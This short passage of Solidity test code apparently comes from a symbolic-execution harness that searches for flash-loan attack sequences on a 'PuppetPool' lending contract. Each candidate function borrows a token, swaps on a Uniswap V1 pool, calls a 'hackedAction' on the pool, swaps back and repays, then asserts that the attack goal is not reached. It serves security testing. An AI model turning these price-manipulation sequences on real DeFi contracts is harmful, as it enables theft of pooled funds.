
                function check_cand0(
                    uint256 amt0,
                    uint256 amt1,
                    uint256 amt2,
                    uint256 amt3,
                    uint256 amt4,
                    uint256 amt5,
                    uint256 amt6) public {
                                vm.assume(amt0 == amt1);
        vm.assume(amt6 == amt0 + 1 ether);
        borrow_ERC20Basic(amt0);
        swap_UniswapV1_ERC20Basic_WETH(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_WETH_ERC20Basic(amt3);
        nop();
        swap_UniswapV1_WETH_ERC20Basic(amt5);
        payback_ERC20Basic(amt6);

                        assert(!attackGoal());
                    }

            


                function check_cand1(
                    uint256 amt0,
                    uint256 amt1,
                    uint256 amt2,
                    uint256 amt3,
                    uint256 amt4,
                    uint256 amt5,
                    uint256 amt6) public {
                                vm.assume(amt0 == amt1);
        vm.assume(amt6 == amt0 + 1 ether);
        borrow_WETH(amt0);
        swap_UniswapV1_WETH_ERC20Basic(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_ERC20Basic_WETH(amt3);
        nop();
        nop();
        payback_WETH(amt6);

                        assert(!attackGoal());
                    }

            

